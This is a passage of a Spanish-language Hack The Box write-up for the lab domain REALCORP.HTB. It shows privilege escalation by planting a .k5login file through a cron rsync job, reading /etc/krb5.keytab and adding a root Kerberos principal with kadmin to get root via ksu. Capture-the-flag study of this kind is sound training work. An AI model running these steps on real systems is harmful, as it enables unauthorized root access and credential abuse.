<span class=line><span style=color:#6a737d># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span>
<span class=line><span style=color:#6a737d># |  |  |  |  |</span></span>
<span class=line><span style=color:#6a737d># *  *  *  *  * user-name  command to be executed</span></span>
<span class=line><span style=color:#f97583>*</span><span style=color:#f97583> *</span><span style=color:#f97583> *</span><span style=color:#f97583> *</span><span style=color:#f97583> *</span><span style=color:#e1e4e8> admin /usr/local/bin/log_backup.sh</span></span>
<span class=line></span></code></pre><p>Echemos un vistazo al script log_backup</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 </span><span style=color:#f97583>~</span><span style=color:#e1e4e8>]$ cat /usr/local/bin/log_backup.sh</span></span>
<span class=line><span style=color:#6a737d>#!/bin/bash</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>/usr/bin/rsync</span><span style=color:#79b8ff> -avz</span><span style=color:#79b8ff> --no-perms</span><span style=color:#79b8ff> --no-owner</span><span style=color:#79b8ff> --no-group</span><span style=color:#9ecbff> /var/log/squid/</span><span style=color:#9ecbff> /home/admin/</span></span>
<span class=line><span style=color:#79b8ff>cd</span><span style=color:#9ecbff> /home/admin</span></span>
<span class=line><span style=color:#b392f0>/usr/bin/tar</span><span style=color:#9ecbff> czf</span><span style=color:#9ecbff> squid_logs.tar.gz.`</span><span style=color:#b392f0>/usr/bin/date</span><span style=color:#9ecbff> +%F-%H%M%S`</span><span style=color:#b392f0> access.log</span><span style=color:#9ecbff> cache.log</span></span>
<span class=line><span style=color:#b392f0>/usr/bin/rm</span><span style=color:#79b8ff> -f</span><span style=color:#9ecbff> access.log</span><span style=color:#9ecbff> cache.log</span></span>
<span class=line></span></code></pre><p>Parece que el usuario administrador copia todo desde la carpeta <code>/var/log/squid</code> a su carpeta de inicio. Luego archiva los dos archivos de registro y los elimina. Como todo se copia, pero solo se eliminan los dos archivos especificados, potencialmente tenemos escritura arbitraria en la carpeta <code>/home/admin</code>.</p><p>Confirmemos esto comprobando si tenemos acceso de escritura a la carpeta <code>/var/log/squid</code>.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 </span><span style=color:#f97583>~</span><span style=color:#e1e4e8>]$ ls -alh /var/log/</span></span>
<span class=line><span style=color:#b392f0>total</span><span style=color:#9ecbff> 1.4M</span></span>
<span class=line><span style=color:#b392f0>drwxr-xr-x.</span><span style=color:#79b8ff> 12</span><span style=color:#9ecbff> root</span><span style=color:#9ecbff>   root</span><span style=color:#9ecbff>   4.0K</span><span style=color:#9ecbff> Feb</span><span style=color:#79b8ff> 23</span><span style=color:#9ecbff> 19:52</span><span style=color:#9ecbff> .</span></span>
<span class=line><span style=color:#b392f0>drwxr-xr-x.</span><span style=color:#79b8ff> 22</span><span style=color:#9ecbff> root</span><span style=color:#9ecbff>   root</span><span style=color:#9ecbff>   4.0K</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff> 24</span><span style=color:#9ecbff> 06:24</span><span style=color:#9ecbff> ..</span></span>
<span class=line><span style=color:#b392f0>drwx-wx---.</span><span style=color:#79b8ff>  2</span><span style=color:#9ecbff> admin</span><span style=color:#9ecbff>  squid</span><span style=color:#79b8ff>    41</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff> 24</span><span style=color:#9ecbff> 06:36</span><span style=color:#9ecbff> squid</span></span>
<span class=line></span></code></pre><p>Parece que solo el usuario administrador puede leer la carpeta, sin embargo, el grupo squid puede escribir en la carpeta. Revisemos nuestros grupos.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 </span><span style=color:#f97583>~</span><span style=color:#e1e4e8>]$ id</span></span>
<span class=line><span style=color:#e1e4e8>uid</span><span style=color:#f97583>=</span><span style=color:#9ecbff>1000</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>j.nakazawa</span><span style=color:#e1e4e8>) gid</span><span style=color:#f97583>=</span><span style=color:#9ecbff>1000</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>j.nakazawa</span><span style=color:#e1e4e8>) groups</span><span style=color:#f97583>=</span><span style=color:#9ecbff>1000</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>j.nakazawa</span><span style=color:#e1e4e8>)</span><span style=color:#9ecbff>,23</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>squid</span><span style=color:#e1e4e8>)</span><span style=color:#9ecbff>,100</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>users</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span></code></pre><p>Parece que somos parte del grupo de squid, lo que confirma nuestro vector de ataque. La única pregunta que queda es qué queremos escribir en la carpeta. Normalmente, escribiría mi clave ssh en .ssh/authorized_keys. Sin embargo, la autenticación de clave pública está deshabilitada. Mi investigación de Kerberos con SSH reveló que hay una manera de permitir que otros usuarios inicien sesión en su cuenta utilizando un archivo .k5login como se indica en este artículo: <a href=https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html>https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html</a></p><p>“Si desea permitir que otra persona inicie sesión en su cuenta a través de Kerberos, puede agregar su principal de Kerberos a su archivo ~/.k5login. ¡Asegúrate de agregar también el tuyo propio si creas este archivo, ya que de lo contrario no podrás acceder a tu propia cuenta!</p><h2 id=privesc-al-administrador-explotación-del-script-log_backup>Privesc al administrador: Explotación del script log_backup<a href=#privesc-al-administrador-explotación-del-script-log_backup class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>tenemos que crear nuestro archivo en /var/log/squid/.k5login y esperar hasta que se copie en la carpeta del administrador. Entonces deberíamos poder utilizar SSH como administrador cuando la tarean cron se ejecute.</p><p>Te recomiendo que lo hagas varias veces, ya que a la primera no va:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 log]$ echo </span><span style=color:#9ecbff>"j.nakazawa@REALCORP.HTB"</span><span style=color:#f97583> ></span><span style=color:#e1e4e8> /var/log/squid/.k5login </span></span>
<span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 log]$ echo </span><span style=color:#9ecbff>"j.nakazawa@REALCORP.HTB"</span><span style=color:#f97583> ></span><span style=color:#e1e4e8> /var/log/squid/.k5login </span></span>
<span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 log]$ echo </span><span style=color:#9ecbff>"j.nakazawa@REALCORP.HTB"</span><span style=color:#f97583> ></span><span style=color:#e1e4e8> /var/log/squid/.k5login </span></span>
<span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 log]$ echo </span><span style=color:#9ecbff>"j.nakazawa@REALCORP.HTB"</span><span style=color:#f97583> ></span><span style=color:#e1e4e8> /var/log/squid/.k5login </span></span>
<span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 log]$ echo </span><span style=color:#9ecbff>"j.nakazawa@REALCORP.HTB"</span><span style=color:#f97583> ></span><span style=color:#e1e4e8> /var/log/squid/.k5login </span></span>
<span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 log]$ echo </span><span style=color:#9ecbff>"j.nakazawa@REALCORP.HTB"</span><span style=color:#f97583> ></span><span style=color:#e1e4e8> /var/log/squid/.k5login </span></span>
<span class=line></span></code></pre><p>Luego nos conectamos por ssh:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ssh</span><span style=color:#9ecbff> admin@10.10.10.224</span><span style=color:#e1e4e8>   </span></span>
<span class=line><span style=color:#b392f0>Activate</span><span style=color:#9ecbff> the</span><span style=color:#9ecbff> web</span><span style=color:#9ecbff> console</span><span style=color:#9ecbff> with:</span><span style=color:#9ecbff> systemctl</span><span style=color:#9ecbff> enable</span><span style=color:#79b8ff> --now</span><span style=color:#9ecbff> cockpit.socket</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Last</span><span style=color:#9ecbff> login:</span><span style=color:#9ecbff> Thu</span><span style=color:#9ecbff> Aug</span><span style=color:#79b8ff>  8</span><span style=color:#9ecbff> 16:00:02</span><span style=color:#79b8ff> 2024</span></span>
<span class=line><span style=color:#e1e4e8>[admin@srv01 </span><span style=color:#f97583>~</span><span style=color:#e1e4e8>]$</span></span>
<span class=line></span></code></pre><p>Obtuvimos con éxito un shell como administrador y ahora podemos continuar nuestra búsqueda de un vector privesc para root.</p><p>Ejecutemos un script de enumeración en la máquina, voy a usar LinPeas.sh: <a href=https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh>https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</a></p><p>Cuando miramos el resultado del script, nos damos cuenta de dos archivos que pertenecen a la raíz y generalmente no son legibles, pero sí pueden ser leídos por el administrador.</p><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>/etc/squid/squid.conf</span></span>
<span class=line><span>/etc/krb5.keytab</span></span>
<span class=line><span></span></span></code></pre><p>El Archivo <code>/etc/krb5.keytab</code> solo es legible por root y admin.</p><p>Echemos un vistazo mas de cerca al expediente.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[admin@srv01 </span><span style=color:#f97583>~</span><span style=color:#e1e4e8>]$ file /etc/krb5.keytab</span></span>
<span class=line><span style=color:#b392f0>krb5.keytab:</span><span style=color:#9ecbff> Kerberos</span><span style=color:#9ecbff> Keytab</span><span style=color:#9ecbff> file,</span><span style=color:#9ecbff> realm=REALCORP.HTB,</span><span style=color:#9ecbff> principal=host/srv01.realcorp.htb,</span><span style=color:#9ecbff> type=1,</span><span style=color:#9ecbff> date=Tue</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  8</span><span style=color:#9ecbff> 22:15:30</span><span style=color:#9ecbff> 2020,</span><span style=color:#9ecbff> kvno=</span><span style=color:#79b8ff>2</span></span>
<span class=line></span></code></pre><p>Investiguemos qué hace este archivo y cómo abrirlo.</p><p>Segun la doc de MIT Kerberos, la tabla de claves es un archivo que almacena claves para los principales.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[admin@srv01 etc]$ klist -k /etc/krb5.keytab </span></span>
<span class=line><span style=color:#b392f0>Keytab</span><span style=color:#9ecbff> name:</span><span style=color:#9ecbff> FILE:/etc/krb5.keytab</span></span>
<span class=line><span style=color:#b392f0>KVNO</span><span style=color:#9ecbff> Principal</span></span>
<span class=line><span style=color:#b392f0>----</span><span style=color:#79b8ff> --------------------------------------------------------------------------</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/changepw@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/changepw@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/changepw@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/changepw@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/changepw@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/admin@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/admin@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/admin@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/admin@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>   2</span><span style=color:#9ecbff> kadmin/admin@REALCORP.HTB</span></span>
<span class=line></span></code></pre><h1 id=privilege-escalation><span style=color:#33acff>Privilege escalation</span><a href=#privilege-escalation class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p>Parece que nuestro usuario también es un kadmin. Esto nos permite agregar principals a la tabla de claves. Podemos explotar esto agregando el usuario root a la tabla de claves con nuestra contraseña especificada.</p><h2 id=agregando-root-a-la-lista-de-principals-keytab>Agregando root a la lista de principals keytab<a href=#agregando-root-a-la-lista-de-principals-keytab class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Agregamos el usuario root con la password</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[admin@srv01 etc]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q </span><span style=color:#9ecbff>"add_principal -pw test root@REALCORP.HTB"</span></span>
<span class=line><span style=color:#b392f0>Couldn</span><span style=color:#b392f0>'t open log file /var/log/kadmind.log: Permission denied</span></span>
<span class=line><span style=color:#b392f0>Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.</span></span>
<span class=line><span style=color:#b392f0>No policy specified for root@REALCORP.HTB; defaulting to no policy</span></span>
<span class=line><span style=color:#b392f0>Principal "root@REALCORP.HTB" created.</span></span>
<span class=line></span></code></pre><p>Ahora podemos usar <code>ksu (ksu - Kerberized super-user)</code> para su a root. (El archivo Keytab se restablece periódicamente, por lo que debemos ser rápidos).</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[admin@srv01 etc]$ ksu</span></span>
<span class=line><span style=color:#b392f0>WARNING:</span><span style=color:#9ecbff> Your</span><span style=color:#9ecbff> password</span><span style=color:#9ecbff> may</span><span style=color:#9ecbff> be</span><span style=color:#9ecbff> exposed</span><span style=color:#9ecbff> if</span><span style=color:#9ecbff> you</span><span style=color:#9ecbff> enter</span><span style=color:#9ecbff> it</span><span style=color:#9ecbff> here</span><span style=color:#9ecbff> and</span><span style=color:#9ecbff> are</span><span style=color:#9ecbff> logged</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#e1e4e8>         in remotely using an unsecure (</span><span style=color:#b392f0>non-encrypted</span><span style=color:#e1e4e8>) channel. </span></span>
<span class=line><span style=color:#b392f0>Kerberos</span><span style=color:#9ecbff> password</span><span style=color:#9ecbff> for</span><span style=color:#9ecbff> root@REALCORP.HTB:</span><span style=color:#9ecbff> :</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>Authenticated</span><span style=color:#9ecbff> root@REALCORP.HTB</span></span>
<span class=line><span style=color:#b392f0>Account</span><span style=color:#9ecbff> root:</span><span style=color:#9ecbff> authorization</span><span style=color:#9ecbff> for</span><span style=color:#9ecbff> root@REALCORP.HTB</span><span style=color:#9ecbff> successful</span></span>
<span class=line><span style=color:#b392f0>Changing</span><span style=color:#9ecbff> uid</span><span style=color:#9ecbff> to</span><span style=color:#9ecbff> root</span><span style=color:#e1e4e8> (0)</span></span>
<span class=line><span style=color:#e1e4e8>[root@srv01 etc]#</span></span>
<span class=line></span></code></pre><p>Iniciamos Sesion con exito como root.</p></div></div></div><div class="flex w-full gap-4 flex-col mb-4 justify-between md:flex-row overflow-hidden"><a href=# class="w-full active:scale-95 font-bold overflow-hidden pointer-events-none"></a> <a href=/posts/validation/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full btn-card gap-4 h-[3.75rem] justify-end max-w-full px-4 rounded-2xl"><div class="transition whitespace-nowrap dark:text-white/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden text-black/75">Validation HTB Writeup</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-right-rounded><path d="M12.6 12L8.7 8.1q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275l4.6 4.6q.15.15.213.325t.062.375t-.062.375t-.213.325l-4.6 4.6q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></div></a></div></main></div><div class="onload-animation col-span-2 grid-rows-3 mt-4" id=footer><div class="flex items-center card-base max-w-[var(--page-width)] mx-auto min-h-[4.5rem] px-6 rounded-b-none"><div class="transition text-50 text-sm">© 2022 Mil4ne. Todos los derechos reservados.<br>Desarrollado por <a href="https://github.com/mil4ne?tab=repositories" class="text-[var(--primary)] font-medium link" target=_blank>Mil4ne</a></div></div></div><div class="back-to-top-wrapper hidden lg:block" data-astro-cid-eymb5ayk><div class="transition flex items-center back-to-top-btn hide overflow-hidden rounded-2xl" id=back-to-top-btn data-astro-cid-eymb5ayk onclick=backToTop()><button class="w-[3.75rem] btn-card h-[3.75rem]" aria-label="Back to Top" data-astro-cid-eymb5ayk><svg data-icon=material-symbols:keyboard-arrow-up-rounded height=1em viewBox="0 0 24 24" width=1em class=mx-auto data-astro-cid-eymb5ayk><symbol id=ai:material-symbols:keyboard-arrow-up-rounded><path d="m12 10.8l-3.9 3.9q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7l4.6-4.6q.3-.3.7-.3t.7.3l4.6 4.6q.275.275.275.7t-.275.7t-.7.275t-.7-.275z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:keyboard-arrow-up-rounded></use></svg></button></div></div><script>function backToTop(){window.scroll({top:0,behavior:"smooth"})}function scrollFunction(){let o=document.getElementById("back-to-top-btn");document.body.scrollTop>600||document.documentElement.scrollTop>600?o.classList.remove("hide"):o.classList.add("hide")}window.onscroll=scrollFunction</script></div></div></body></html>